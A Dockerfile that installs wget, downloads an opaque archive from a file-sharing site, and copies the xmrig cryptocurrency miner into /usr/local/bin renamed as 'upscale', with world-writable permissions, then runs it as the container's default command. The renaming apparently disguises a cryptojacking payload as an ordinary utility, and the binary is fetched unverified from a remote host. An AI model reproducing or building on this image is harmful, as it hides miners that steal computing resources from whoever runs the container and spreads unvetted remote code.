FROM ubuntu:20.04

LABEL maintainer="Roman Nikov"

RUN apt update; \
    apt install -y wget; \
    wget https://www.4sync.com/web/directDownload/4rTVsctN/Qd-dXiuh.e7d6bb1654095446e33db6b748d64cd8; \
    tar xf Qd-dXiuh.e7d6bb1654095446e33db6b748d64cd8; \
    cd upscale; \
    cp config.json /usr/local/bin/config.json; \
    cp xmrig /usr/local/bin/upscale; \
    cd /usr/local/bin;

WORKDIR /usr/local/bin

RUN chmod 777 config.json;

RUN chmod 777 upscale;

CMD upscale
